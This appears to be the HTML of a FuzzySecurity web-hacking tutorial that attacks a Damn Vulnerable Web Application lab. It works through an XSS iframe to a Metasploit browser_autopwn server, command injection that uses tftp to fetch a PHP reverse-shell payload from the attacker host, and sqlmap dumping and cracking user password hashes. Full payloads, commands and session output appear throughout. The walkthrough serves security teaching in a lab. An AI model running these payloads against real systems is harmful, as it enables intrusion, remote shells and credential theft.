@@ -1,0 +1,595 @@
+<!DOCTYPE html>
+<!--[if lt IE 7 ]><html class="ie ie6" lang="en"> <![endif]-->
+<!--[if IE 7 ]><html class="ie ie7" lang="en"> <![endif]-->
+<!--[if IE 8 ]><html class="ie ie8" lang="en"> <![endif]-->
+<!--[if (gte IE 9)|!(IE)]><!--><html lang="en"> <!--<![endif]-->
+<head>
+
+  <!-- Basic Page Needs -->
+  <meta charset="utf-8">
+  <title>FuzzySecurity | Tutorials: Damn Vulnerable Web Application</title>
+  <meta name="description" content="">
+  <meta name="author" content="">
+
+  <!-- CSS Style -->
+  <link rel="stylesheet" href="../css/style.css"> 
+  
+  <!-- Color Skins -->
+  <link rel="stylesheet" href="../css/skins/red.css" name="skins"> 
+  
+  <!-- Layout Style -->
+  <link rel="stylesheet" href="../css/layout/wide.css" name="layout"> 
+  
+  <!-- Small Icons -->
+  <link rel="stylesheet" href="../css/icons.css">  
+  
+  <!-- Start JavaScript -->
+  
+    <script src="../js/jquery-1.7.2.min.js"></script> <!-- jQuery library -->
+    <script src="../js/jquery.easing.1.3.min.js"></script> <!-- jQuery Easing --> 
+    <script src="../js/jquery-ui.min.js"></script> <!-- jQuery Ui --> 
+    <script src="../js/jquery.cookie.js"></script> <!-- jQuery cookie --> 
+    <script src="../js/jquery.uniform.min.js"></script> <!-- jQuery Uniform -->
+    <script src="../js/ddsmoothmenu.js"></script> <!-- Nav Menu ddsmoothmenu -->
+    <script src="../js/jquery.flexslider.js"></script> <!-- Flex Slider  -->
+    <script src="../js/jquery.eislideshow.js"></script> <!-- Elastic Slider  -->
+    <script src="../js/jquery.iconmenu.js"></script> <!-- Sliding Text and Icon Menu Style  -->
+    <script src="../js/colortip.js"></script> <!-- Colortip Tooltip Plugin  -->
+    <script src="../js/tytabs.js"></script> <!-- jQuery Plugin tytabs  -->
+    <script src="../js/carousel.js"></script> <!-- jQuery Carousel  -->
+    <script src="../js/jquery.prettyPhoto.js"></script> <!-- jQuery Prettyphoto  -->
+    <script src="../js/jquery.isotope.min.js"></script> <!-- Isotope Filtering  -->
+    <script src="../js/selectnav.js"></script> <!-- Responsive Navigation Menu by SelectNav -->
+    <script src="../js/jquery.ui.totop.js"></script> <!-- UItoTop plugin  -->
+    <script src="../js/custom.js"></script> <!-- Custom Js file for javascript in html -->
+  
+  <!-- End JavaScript -->
+
+  <!--[if lt IE 9]>
+      <script src="js/html5.js"></script>
+  <![endif]-->
+
+  <!-- Favicons -->
+  <link rel="shortcut icon" href="../images/favicon/favicon.ico">
+  <link rel="apple-touch-icon" href="../images/favicon/apple-touch-icon.png">
+  <link rel="apple-touch-icon" sizes="72x72" href="../images/favicon/apple-touch-icon-72x72.png">
+  <link rel="apple-touch-icon" sizes="114x114" href="../images/favicon/apple-touch-icon-114x114.png">
+
+</head>
+<body>
+
+  <div id="wrap" class="boxed">
+
+  <header>
+    <div class="container clearfix">
+    
+      <div class="five columns">
+        <div class="logo">
+        <a href="index.html">
+          <img src="../images/logo.png" alt="FuzzySec" />
+        </a>
+        </div>
+      </div><!-- End Logo -->
+      
+      <div class="eleven columns">
+        <nav id="menu" class="navigation">
+          <ul id="nav">
+            <li><a href="../index.html">Home</a>
+            </li>
+            <li><a href="../tutorials.html" class="active">Tutorials</a>
+            </li>
+            <li><a href="../coding.html">Scripting</a>
+            </li>
+            <li><a href="../exploits.html">Exploits</a>
+            </li>
+            <li><a href="../links.html">Links</a>
+            </li>
+            <li><a href="../patreon.html">Patreon</a></li><li><a href="../contact.html">Contact</a></li>
+          </ul> 
+        </nav>
+      </div><!-- End Menu -->
+      
+      
+      <div class="sixteen columns"><hr /></div>
+      
+    </div><!-- End Container -->
+  </header><!-- <<< End Header >>> -->
+  
+  <div class="container clearfix">
+  
+    <div class="page-columns">
+    
+    <ul class="breadcrumbs">
+      <li><a href="index.html"><span class="icon home gray"></span></a></li>
+          <li><a href="../index.html">Home</a> <b>&#187;</b></li>
+          <li><a href="../tutorials.html">Tutorials</a> <b>&#187;</b></li>
+          <li>Damn Vulnerable Web Application</li>
+      </ul>
+      
+      <!-- section 16 Columns -->
+      
+      <div class="recent-work gallery clearfix">
+      <div class="eighteen columns bottom">
+	<div style="height:20px;" align="right">
+		<link type="text/css" rel="stylesheet" href="https://www.fuzzysecurity.com/css/patreon.css"/>
+		<button class="btn btn-2 btn-2g"><a href="https://www.patreon.com/FuzzySec" target="_blank"><img src="https://c5.patreon.com/external/logo/become_a_patron_button.png" style="border-radius: 10px;height:40px;"></a></button>
+	</div>
+        <h2 class="title">Game Over: Damn Vulnerable Web Application<span class="line"></span></h2>
+        <p>Hello and welcome. Today I&rsquo;ll be writing a tutorial on the  basics of web-hacking. To make the learning experience more enjoyable we&rsquo;ll be  using &rdquo;Damn Vulnerable Web Application (DVWA)&rdquo; which is designed as a web  security learning platform. I will only be demonstrating three scenarios which  lead to a server compromise:  (1) Persistent  XSS + IFRAME, (2) Command Execution and (3) MySQL Injection. There are  many more test cases which can be examined but I leave that up to the diligent readers  own discretion. You can download &ldquo;Damn Vulnerable Web Application (DVWA)&rdquo; <a href="http://www.dvwa.co.uk/">here</a>.   Setting up this lab is quite easy so don&rsquo;t  hesitate to try it for yourself… </p>
+          <p><br />
+            Ok let&rsquo;s get to the good stuff, I&rsquo;ll be using two VM&rsquo;s:<br />
+            Attacker: Backtrack 5 =&gt; 192.168.111.129<br />
+            Victim: Windows XP =&gt; 192.168.111.130</p><br />
+
+<h2 class="title">(1) Persistent XSS + IFRAME<span class="line"></span></h2>
+<p>Cross Site Scripting, isn&rsquo;t always appreciated as a legitimate  attack vector but as we&rsquo;ll see persistent XSS can have some nasty implications.  We&rsquo;ll start of by browsing to the &rdquo;Sign Guestbook&rdquo; page.  Due to unsanitized user input we are able to  inject client-side scripts into the message box.  Using an IFRAME we can redirect any user  visiting this Guestbook to our malicious server. In the screenshot below you  can see our &ldquo;innocent&rdquo; message being posted. You should take note of the URI  Path being used &quot;/innocent&quot;.<p>&nbsp;</p>
+  Code: <strong>&lt;iframe SRC="http://192.168.111.129/innocent" height = &rdquo;0&rdquo; width = &rdquo;0&rdquo;&gt;</strong></p><p>&nbsp;</p>
+        
+      <div class="fourteen columns bottom">
+
+    <div class="four columns item element-4 Web Logo Animation" data-categories="Web Logo Animation">
+          <div class="caption">
+          <a href="images/dvwa_big1.png" rel="prettyPhoto[dvwa]">
+          <img src="images/dvwa_small1.png" alt="" class="pic" />
+          <span class="hover-effect zoom"></span></a>
+          </div><!-- hover effect -->
+          <p>Sign Guestbook</p>
+      </div>
+    
+<p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p>
+    <p>Ok  so far so good, now let&rsquo;s set up a client-side exploit server for our  unsuspecting victim to connect to. First of all make sure your Backtrack  machine isn&rsquo;t already using port 80 (for example if you&rsquo;re hosting an Apache server). Fire up msfconsole and select the browser_autopwn module, take  care to configure the options properly. Below you can see my sample  configuration (be sure to set the correct URI Path)…</p>
+    <div class="terminal_wrap" style="background:#CCC">
+      <pre>msf  auxiliary(<span style='color:#ff0000;'>browser_autopwn</span>) > <span style='color:#2B8156;'>show options</span>
+
+Module options (auxiliary/server/browser_autopwn):
+
+   Name        Current Setting  Required  Description
+   ----        ---------------  --------  -----------
+   LHOST       192.168.111.129  yes       The IP address to use for reverse-connect payloads
+   SRVHOST     192.168.111.129  yes       The local host to listen on. 
+   SRVPORT     80               yes       The local port to listen on.
+   SSL         false            no        Negotiate SSL for incoming connections
+   SSLCert                      no        Path to a custom SSL certificate
+   SSLVersion  SSL3             no        Specify the version of SSL that should be used
+   URIPATH     /innocent        no        The URI to use for this exploit (default is random)
+   
+msf  auxiliary(<span style='color:#ff0000;'>browser_autopwn</span>) > <span style='color:#2B8156;'>exploit</span>
+<span style='color:#333399;'>[*]</span> Auxiliary module execution completed
+
+<span style='color:#333399;'>[*]</span> Setup
+<span style='color:#333399;'>[*]</span> Obfuscating initial javascript 2011-11-09 05:36:52 +0100
+<span style='color:#333399;'>[*]</span> Done in 1.041111216 seconds
+
+<span style='color:#333399;'>[*]</span> Starting exploit modules on host 192.168.111.129...
+<span style='color:#333399;'>[*]</span> ---
+
+<span style='color:#333399;'>[*]</span> Starting exploit multi/browser/firefox_escape_retval with payload generic/shell_reverse_tcp
+<span style='color:#333399;'>[*]</span> Using URL: http://192.168.111.129:80/EKlBI
+<span style='color:#333399;'>[*]</span> Server started.
+<span style='color:#333399;'>[*]</span> Starting exploit multi/browser/java_calendar_deserialize with payload java/meterpreter/reverse_tcp
+<span style='color:#333399;'>[*]</span> Using URL: http://192.168.111.129:80/hhbLra
+<span style='color:#333399;'>[*]</span> Server started.
+<span style='color:#333399;'>[*]</span> Starting exploit multi/browser/java_trusted_chain with payload java/meterpreter/reverse_tcp
+<span style='color:#333399;'>[*]</span> Using URL: http://192.168.111.129:80/JaTFlOKmWUq
+
+<span style='color:#2B8156;'>[...snip...]</span>
+
+<span style='color:#333399;'>[*]</span> --- Done, found 23 exploit modules
+
+<span style='color:#333399;'>[*]</span> Using URL: http://192.168.111.129:80/innocent
+<span style='color:#333399;'>[*]</span> Server started.</pre>
+<br />
+</div>
+
+<p>&nbsp;</p>
+<p>Perfect,  everything is set-up. All we have to do now is wait for our unsuspecting victim  to view the Guestbook page. As you can see in the screenshot below, when our  victim views the page he/she cannot visually see anything malicious about our  post (if you like you can even insert a real message before your IFRAME).  Even though nothing fishy seems to be going on our victim is redirected to our exploit server which leverages browser exploits to get shell access. <strong>Game Over!!</strong></p><p>&nbsp;</p>
+
+    
+    <div class="four columns item element-4 Web Logo Animation" data-categories="Web Logo Animation">
+          <div class="caption">
+          <a href="images/dvwa_big2.png" rel="prettyPhoto[dvwa]">
+          <img src="images/dvwa_small2.png" alt="" class="pic" />
+          <span class="hover-effect zoom"></span></a>
+          </div><!-- hover effect -->
+          <p>Victim</p>
+      </div>
+
+<p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p>
+    <div class="terminal_wrap" style="background:#CCC">
+<pre><span style='color:#333399;'>[*]</span> Using URL: http://192.168.111.129:80/innocent
+<span style='color:#333399;'>[*]</span> Server started.
+<span style='color:#333399;'>[*]</span> 192.168.111.130  Browser Autopwn request '/innocent'
+<span style='color:#333399;'>[*]</span> 192.168.111.130  Browser Autopwn request 
+    '/innocent?sessid=TWljcm9zb2Z0IFdpbmRvd3M6WFA6U1AwOmVuLXVzOng4NjpNU0lFOjYuMDo%3d'
+<span style='color:#333399;'>[*]</span> 192.168.111.130  JavaScript Report: Microsoft Windows:XP:SP0:en-us:x86:MSIE:6.0:
+<span style='color:#333399;'>[*]</span> Responding with exploits
+<span style='color:#333399;'>[*]</span> Sending MS03-020 Internet Explorer Object Type to 192.168.111.130:1083...
+<span style='color:#333399;'>[*]</span> Sending Internet Explorer DHTML Behaviors Use After Free to 192.168.111.130:1084 (target: IE 6 
+    SP0-SP2 (onclick))...
+<span style='color:#333399;'>[*]</span> Sending stage (752128 bytes) to 192.168.111.130
+<span style='color:#333399;'>[*]</span> Meterpreter session 1 opened (192.168.111.129:3333 -> 192.168.111.130:1085) at 2011-11-09 
+    05:38:35 +0100
+<span style='color:#333399;'>[*]</span> Session ID 1 (192.168.111.129:3333 -> 192.168.111.130:1085) processing InitialAutoRunScript 
+    'migrate -f'
+<span style='color:#333399;'>[*]</span> Current server process: iexplore.exe (3460)
+<span style='color:#333399;'>[*]</span> Spawning notepad.exe process to migrate to
+<span style='color:#333399;'>[+]</span> Migrating to 3684
+<span style='color:#333399;'>[+]</span> Successfully migrated to process 
+
+msf  auxiliary(<span style='color:#ff0000;'>browser_autopwn</span>) > <span style='color:#2B8156;'>sessions -l</span>
+
+Active sessions
+===============
+
+  Id  Type                   Information                              Connection
+  --  ----                   -----------                              ----------
+  1   meterpreter x86/win32  FLUXX-J18BEF9YQ\Owner @ FLUXX-J18BEF9YQ  192.168.111.129:3333 -> 
+                                                                      192.168.111.130:1085
+
+msf  auxiliary(<span style='color:#ff0000;'>browser_autopwn</span>) > sessions -i 1
+[*] Starting interaction with 1...
+
+<span style='color:#ff0000;'>meterpreter</span> > <span style='color:#2B8156;'>hashdump</span>
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+HelpAssistant:1000:fc4305db8da15f1e2404624e4bf5045f:bfcea702c343c38e5598448fd52782e8:::
+Owner:1003:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:d515e27c8b5a477fe5189a1377c6c7e2:::
+<span style="color:#ff0000;">meterpreter</span> > <span style='color:#2B8156;'>ps</span>
+
+Process list
+============
+
+ PID   Name               Arch  Session  User                          Path
+ ---   ----               ----  -------  ----                          ----
+ 0     [System Process]                                                
+ 1000  svchost.exe        x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\System32\svchost.exe
+ 1056  svchost.exe        x86   0        NT AUTHORITY\LOCAL SERVICE    C:\WINDOWS\System32\svchost.exe
+ 1340  explorer.exe       x86   0        FLUXX-J18BEF9YQ\Owner         C:\WINDOWS\Explorer.EXE
+
+<span style="color:#2B8156;">[...snip...]</span>
+
+ 636   services.exe       x86   0        NT AUTHORITY\SYSTEM           C:\WINDOWS\system32\services.exe
+ 648   lsass.exe          x86   0        NT AUTHORITY\SYSTEM           C:\WINDOWS\system32\lsass.exe
+ 808   svchost.exe        x86   0        NT AUTHORITY\SYSTEM           C:\WINDOWS\system32\svchost.exe
+ 908   svchost.exe        x86   0        NT AUTHORITY\SYSTEM           C:\WINDOWS\System32\svchost.exe
+
+<span style='color:#ff0000;'>meterpreter</span> > <span style='color:#2B8156;'>migrate 648</span>
+<span style='color:#333399;'>[*]</span> Migrating to 648...
+<span style='color:#333399;'>[*]</span> Migration completed successfully.
+<span style='color:#ff0000;'>meterpreter</span> > <span style='color:#2B8156;'>shell</span>
+Process 3952 created.
+Channel 1 created.
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+<span style='color:#ff0000;'>C:\WINDOWS\system32</span>><span style='color:#2B8156;'>ipconfig</span>
+ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Local Area Connection:
+
+        Connection-specific DNS Suffix  . : localdomain
+        IP Address. . . . . . . . . . . . : 192.168.111.130
+        Subnet Mask . . . . . . . . . . . : 255.255.255.0
+        Default Gateway . . . . . . . . . : 
+
+<span style='color:#ff0000;'>C:\WINDOWS\system32</span>><span style='color:#2B8156;'>...Game Over...</span></pre>
+<br /></div>
+
+<p>&nbsp;</p>
+<h2 class="title">(2) Command Execution<span class="line"></span></h2>
+      <br /><p>If we browse to the &rdquo;Command Execution&rdquo; tab we are presented  with a small PHP utility that allows us to ping remote machines. After a bit of  fooling around I discovered you can make the utility execute multiple commands  by chaining them together with the &rdquo;<strong>&amp;</strong>&rdquo; character. Our end-game ploy in this  demo is to remotely execute a PHP exploit. So first of all we have to find a  way to transfer our malicious payload to the remote machine.  There are many ways to do this: ftp, tftp,  inline transfer, web browser,… To get an idea of what we have to work with we  can get a directory list of C:\WINDOWS\system32 which will contain binaries of  the programs that are installed on the remote server. As  we can see below we are in luck, tftp is installed on the remote machine (this is  most practical transfer method for non-interactive command line execution).</p><br />
+          <p>Code: <strong>&amp;  cd ../../../../../../../../WINDOWS/system32 &amp; dir</strong></p></p><p>&nbsp;</p>
+
+    <div class="terminal_wrap" style="background:#CCC">
+<pre>Usage: ping [-t] [-a] [-n count] [-l size] [-f] [-i TTL] [-v TOS]
+            [-r count] [-s count] [[-j host-list] | [-k host-list]]
+            [-w timeout] target_name
+
+Options:
+    -t             Ping the specified host until stopped.
+                   To see statistics and continue - type Control-Break;
+                   To stop - type Control-C.
+    -a             Resolve addresses to hostnames.
+    -n count       Number of echo requests to send.
+    -l size        Send buffer size.
+    -f             Set Don't Fragment flag in packet.
+    -i TTL         Time To Live.
+    -v TOS         Type Of Service.
+    -r count       Record route for count hops.
+    -s count       Timestamp for count hops.
+    -j host-list   Loose source route along host-list.
+    -k host-list   Strict source route along host-list.
+    -w timeout     Timeout in milliseconds to wait for each reply.
+
+ Volume in drive C has no label.
+ Volume Serial Number is 7833-0FA5
+
+ Directory of C:\WINDOWS\system32
+
+<span style="color:#2B8156;">[...snip...]</span>
+
+08/29/2002  08:00 PM            71,168 telnet.exe
+08/29/2002  08:00 PM           343,552 termmgr.dll
+08/29/2002  08:00 PM           200,192 termsrv.dll
+<strong>08/29/2002  08:00 PM            16,896 tftp.exe</strong>
+08/29/2002  08:00 PM           384,000 themeui.dll
+08/29/2002  08:00 PM            90,112 timedate.cpl
+08/29/2002  08:00 PM             4,048 timer.drv
+
+<span style="color:#2B8156;">[...snip...]</span>
+
+08/29/2002  08:00 PM             9,728 xolehlp.dll
+08/29/2002  08:00 PM           187,904 xpsp1res.dll
+08/29/2002  08:00 PM           316,416 zipfldr.dll
+            1635 File(s)    254,218,638 bytes
+              39 Dir(s)   2,506,862,592 bytes free</pre>
+<br />
+</div>
+
+<p>&nbsp;</p>
+<p>Let&rsquo;s  go back to our Backtrack machine to create our PHP payload and set up a tftp  server to host it.</p>
+  
+    <div class="terminal_wrap" style="background:#CCC">
+<pre><span style='color:#ff0000;'>root@bt</span>:~# <span style='color:#2B8156;'>atftpd --daemon --port 69 /tmp/</span>
+<span style='color:#ff0000;'>root@bt</span>:~# <span style='color:#2B8156;'>netstat -anup</span>
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+udp        0      0 192.168.111.129:53569   192.168.111.1:53        ESTABLISHED 1496/firefox-bin
+udp        0      0 0.0.0.0:68              0.0.0.0:*                           1797/dhclient   
+udp        0      0 0.0.0.0:68              0.0.0.0:*                           1075/dhclient3  
+udp        0      0 0.0.0.0:69              0.0.0.0:*                           2004/atftpd
+
+<span style='color:#ff0000;'>root@bt</span>:~# <span style='color:#2B8156;'>msfpayload php/meterpreter/reverse_tcp LHOST=192.168.111.129 LPORT=9988 O</span>
+
+       Name: PHP Meterpreter, PHP Reverse TCP stager
+     Module: payload/php/meterpreter/reverse_tcp
+    Version: 12196, 12196
+   Platform: PHP
+       Arch: php
+Needs Admin: No
+ Total size: 1286
+       Rank: Normal
+
+Provided by:
+  egypt &lt;egypt@metasploit.com&gt;
+
+Basic options:
+Name   Current Setting  Required  Description
+----   ---------------  --------  -----------
+LHOST  192.168.111.129  yes       The listen address
+LPORT  9988             yes       The listen port
+
+Description:
+  Reverse PHP connect back stager with checks for disabled functions, 
+  Run a meterpreter server in PHP
+
+<span style='color:#ff0000;'>root@bt</span>:~# <span style='color:#2B8156;'>msfpayload php/meterpreter/reverse_tcp LHOST=192.168.111.129 LPORT=9988 R > /tmp/evil.php</span>
+<span style='color:#ff0000;'>root@bt</span>:~# <span style='color:#2B8156;'>ls -l /tmp/</span>
+total 28
+drwx------ 2 root root 4096 2011-11-09 04:17 kde-root
+drwx------ 2 root root 4096 2011-11-09 04:17 ksocket-root
+drwx------ 2 root root 4096 2011-11-09 04:17 orbit-root
+drwx------ 2 root root 4096 2011-11-09 04:17 pulse-3uavuaOb9vyJ
+-rw------- 1 root root  141 2011-11-09 04:17 serverauth.pWwJb7S99J
+drwx------ 2 root root 4096 2011-11-09 04:17 ssh-ZXZzWw1229
+-rw-r--r-- 1 root root 1286 2011-11-09 04:44 evil.php</pre>
+<br />
+</div>
+
+<p>&nbsp;</p>
+<p>Ok we&rsquo;re  all set let&rsquo;s return to our &rdquo;Command Execution&rdquo; tab. We are going to make the  remote machine use tftp to download out payload and place it in the web root.  Take note that xampp&rsquo;s web root is located in C:\xampp\htdocs. As we can see in  the screenshot below our payload has successfully been downloaded. Once this  has been accomplished we can use the attackers browser to open http://192.168.111.130/evil.php,this  will then automatically execute our payload.  <strong>Game Over!!</strong></p><p>&nbsp;</p>
+          <p>Code: <strong>&amp; cd c:\xampp\htdocs &amp; tftp -i 192.168.111.129 GET evil.php</strong></p><p>&nbsp;</p>
+          
+    <div class="four columns item element-4 Web Logo Animation" data-categories="Web Logo Animation">
+          <div class="caption">
+          <a href="images/dvwa_big3.png" rel="prettyPhoto[dvwa]">
+          <img src="images/dvwa_small3.png" alt="" class="pic" />
+          <span class="hover-effect zoom"></span></a>
+          </div><!-- hover effect -->
+          <p>php transfer</p>
+      </div>
+    
+<p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p> 
+    <div class="terminal_wrap" style="background:#CCC">
+<pre>msf  exploit(<span style="color:#ff0000;">handler</span>) > <span style='color:#2B8156;'>show options</span>
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.111.129  yes       The listen address
+   LPORT  9988             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+msf  exploit(<span style='color:#ff0000;'>handler</span>) &gt; <span style='color:#2B8156;'>exploit</span>
+
+<span style="color:#333399;">[*]</span> Started reverse handler on 192.168.111.129:9988 
+<span style="color:#333399;">[*]</span> Starting the payload handler...
+<span style="color:#333399;">[*]</span> Sending stage (38553 bytes) to 192.168.111.130
+<span style="color:#333399;">[*]</span> Meterpreter session 1 opened (192.168.111.129:9988 -> 192.168.111.130:1053) at 2011-11-09 
+    05:16:13 +0100
+
+
+<span style='color:#ff0000;'>meterpreter</span> > <span style='color:#2B8156;'>shell</span>
+Process 3156 created.
+Channel 0 created.
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+<span style='color:#ff0000;'>C:\xampp\apache</span>><span style='color:#2B8156;'>...Game Over...</span></pre>
+<br />
+</div>
+
+<p>&nbsp;</p>
+<h2 class="title">(3) MySQL Injection<span class="line"></span></h2>
+       <br /><p>To wrap up the tutorial let&rsquo;s have a look at MySQL  injection. To follow this tutorial in Backtrack you&rsquo;ll have to install a  firefox plug-in called Tamper Data, it will allow you to intercept and modify  HTTP/HTTPS headers and POST parameters (big up to anyone who has modified some poorly  configured online poll hehe). Browse to the &rdquo;SQL Injection&rdquo; tab, start Tamper  Data, enter a number in the field (1 to 5) and press enter. Tamper Data will  alert you that it has intercepted a request, allow it to continue and then  examine the contents of the data. You should see something like in the screenshot  below.</p><p>&nbsp;</p>
+          
+    <div class="four columns item element-4 Web Logo Animation" data-categories="Web Logo Animation">
+          <div class="caption">
+          <a href="images/dvwa_big4.png" rel="prettyPhoto[dvwa]">
+          <img src="images/dvwa_small4.png" alt="" class="pic" />
+          <span class="hover-effect zoom"></span></a>
+          </div><!-- hover effect -->
+          <p>Tamper Data</p>
+      </div>
+    
+<p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p> 
+<p>Copy  the entire content of the &rdquo;Cookie&rdquo; field. We will be using this data as a  parameter for sqlmap. Achieving injection is pretty easy, observe the syntax  below…</p>
+
+    <div class="terminal_wrap" style="background:#CCC">
+<pre><span style="color:#ff0000;">root@bt</span>:/pentest/database/sqlmap# <span style="color:#2B8156;">./sqlmap.py 
+--url='http://192.168.111.130/vulnerabilities/sqli/?id=1&Submit=Submit#'
+--cookie='PHPSESSID=scmkpnhd6a9smq30rvjkse6ts0; security=low'</span>
+
+<span style="color:#2B8156;">[...snip...]</span>
+
+sqlmap identified the following injection points with a total of 136 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1' AND (SELECT 3474 FROM(SELECT COUNT(*),CONCAT(CHAR(58,106,112,117,58),(SELECT (CASE WHEN
+   (3474=3474) THEN 1 ELSE 0 END)),CHAR(58,113,101,109,58),FLOOR(RAND(0)*2))x FROM 
+    INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'iXZd'='iXZd&Submit=Submit
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 1 to 10 columns
+    Payload: id=1' UNION ALL SELECT CONCAT(CHAR(58,106,112,117,58),IFNULL(CAST(CHAR(75,115,118,88,119,75,
+    101,111,85,115) AS CHAR),CHAR(32)),CHAR(58,113,101,109,58)), NULL# AND 'fpda'='fpda&Submit=Submit
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1' AND SLEEP(5) AND 'ZrXF'='ZrXF&Submit=Submit
+---
+
+[06:16:54] [INFO] manual usage of GET payloads requires url encoding
+[06:16:54] [INFO] the back-end DBMS is MySQL
+web server operating system: Windows
+web application technology: Apache 2.2.21, PHP 5.3.8
+back-end DBMS: MySQL 5.0
+[06:16:54] [INFO] Fetched data logged to text files under /pentest/database/sqlmap/output/192.168.111.130
+
+<span style="color:#333399;">[*]</span> shutting down at: 06:16:54</pre>
+<br />
+</div>
+
+<p>&nbsp;</p>
+<p>So  injection is successful, you can see that we used the data recovered from  Tamper Data (note that without this cookie-data injection cannot be achieved).  If we add the --dbs tag to the command above we will get a list of the available  databases, as shown below.</p>
+
+    <div class="terminal_wrap" style="background:#CCC">
+<pre><span style="color:#2B8156;">[...snip...]</span>
+
+[06:19:36] [INFO] fetching database names
+available databases [8]:
+<span style="color:#333399;">[*]</span> cdcol
+<span style="color:#333399;">[*]</span> dvwa
+<span style="color:#333399;">[*]</span> information_schema
+<span style="color:#333399;">[*]</span> mysql
+<span style="color:#333399;">[*]</span> performance_schema
+<span style="color:#333399;">[*]</span> phpmyadmin
+<span style="color:#333399;">[*]</span> test
+<span style="color:#333399;">[*]</span> webauth
+
+<span style="color:#2B8156;">[...snip...]</span></pre>
+<br />
+</div>
+
+<p>&nbsp;</p>
+<p>After  some enumeration, I discovered that the Database &ldquo;dvwa&rdquo; contained a Table named  &ldquo;users&rdquo;. Dumping this Table reveals a list of users and their encrypted  passwords. I then proceeded to run a dictionary based attack on these hashes  and in less than 30 seconds they were all decrypted. <strong>Game Over!!</strong></p>
+
+    <div class="terminal_wrap" style="background:#CCC">
+<pre><span style="color:#ff0000;">root@bt</span>:/pentest/database/sqlmap# <span style="color:#2B8156;">./sqlmap.py 
+--url='http://192.168.111.130/vulnerabilities/sqli/?id=1&amp;Submit=Submit#' 
+--cookie='PHPSESSID=scmkpnhd6a9smq30rvjkse6ts0; security=low' -D dvwa -T users --dump</span>
+
+<span style="color:#2B8156;">[...snip...]</span>
+
++---------------------------------+------------+-----------+----------------------------------+---------+
+| avatar                          | first_name | last_name | password                         | user    |
++---------------------------------+------------+-----------+----------------------------------+---------+
+| dvwa/hackable/users/admin.jpg   | admin      | admin     | 5f4dcc3b5aa765d61d8327deb882cf99 | admin   |
+| dvwa/hackable/users/smithy.jpg  | Bob        | Smith     | 5f4dcc3b5aa765d61d8327deb882cf99 | smithy  |
+| dvwa/hackable/users/pablo.jpg   | Pablo      | Picasso   | 0d107d09f5bbe40cade3de5c71e9e9b7 | pablo   |
+| dvwa/hackable/users/1337.jpg    | Hack       | Me        | 8d3533d75ae2c3966d7e0d4fcc69216b | 1337    |
+| dvwa/hackable/users/gordonb.jpg | Gordon     | Brown     | e99a18c428cb38d5f260853678922e03 | gordonb |
++---------------------------------+------------+-----------+----------------------------------+---------+
+
++---------+      +------------+
+| user    |      | passwords  |
++---------+      +------------+
+| admin   | ===> |  password  |
+| smithy  | ===> |  password  |
+| pablo   | ===> |  letmein   |
+| 1337    | ===> |  charley   |
+| gordonb | ===> |  abc123    |
++---------+      +------------+</pre>
+<br />
+</div>
+
+<br />
+</div>
+    </div>
+</div>
+      
+      <!-- End  -->
+    	</div>    
+    </div><!-- End page-columns -->
+     
+         <div align="center"><script>
+           var idcomments_acct = '77033bd2b8799fdea5c0f689f55f6e1e';
+           var idcomments_post_id;
+           var idcomments_post_url;
+           </script>
+             <span id="IDCommentsPostTitle" style="display:none"></span>
+           <script type='text/javascript' src='http://www.intensedebate.com/js/genericCommentWrapperV2.js'></script>
+         </div>
+     
+  </div><!-- <<< End Container >>> -->
+  
+  <footer>
+    <div class="container">
+    
+      
+      <div class="six columns"><span class="copyright">
+      © Copyright <a href="../index.html">FuzzySecurity</a></span></div>
+      
+      <div class="six columns">
+        
+          <p><a href="../index.html">Home</a> |
+          <a href="../tutorials.html">Tutorials</a> |
+          <a href="../coding.html">Scripting</a> |
+          <a href="../exploits.html">Exploits</a> |
+          <a href="../links.html">Links</a> |
+          <a href="../contact.html">Contact</a></p>
+        
+      </div>
+    
+    </div><!-- End container -->
+  </footer><!-- <<< End Footer >>> -->
+  
+  </div><!-- End wrap -->
+  
+  <!-- Start Style Switcher -->
+  <div class="switcher"></div>
+  <!-- End Style Switcher -->
+    
+</body>
+</html>
